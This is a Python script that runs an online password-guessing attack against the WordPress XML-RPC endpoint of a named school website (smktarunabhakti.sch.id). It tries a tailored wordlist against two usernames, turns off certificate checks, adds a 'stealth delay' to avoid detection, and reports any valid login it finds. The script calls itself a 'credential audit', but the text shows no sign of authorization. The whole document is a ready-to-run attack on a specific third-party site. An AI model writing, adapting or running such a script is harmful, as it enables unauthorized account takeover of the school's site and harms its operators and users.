import httpx
import asyncio

url = "https://smktarunabhakti.sch.id/xmlrpc.php"

# Daftar target
targets = {
    "networking": ["networking", "networking123", "adminnetworking", "mikrotik", "cisco", "p@ssword", "admin12345"],
    "smktarunabhakti": ["smktarunabhakti", "smktarunabhakti123", "tarunabhakti", "adminTB", "TBDepok2024", "smkTB2024", "admin123"]
}

async def test_credential(user, pw):
    payload = f"""<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{user}</value></param><param><value>{pw}</value></param></params></methodCall>"""
    try:
        async with httpx.AsyncClient(verify=False) as client:
            resp = await client.post(url, data=payload, timeout=15)
            if "isAdmin" in resp.text or "blogid" in resp.text:
                return True
            return False
    except:
        return False

async def main():
    print("[*] Starting technical credential audit...")
    for user, pws in targets.items():
        print(f"\n[*] Auditing user: {user}")
        for pw in pws:
            print(f"    - Testing: {pw}")
            if await test_credential(user, pw):
                print(f"\n[!!!] SUCCESS! Found valid account: {user} : {pw}\n")
                return
            await asyncio.sleep(1.5) # Stealth delay
    print("\n[-] No matches found in this technical wordlist.")

if __name__ == "__main__":
    asyncio.run(main())
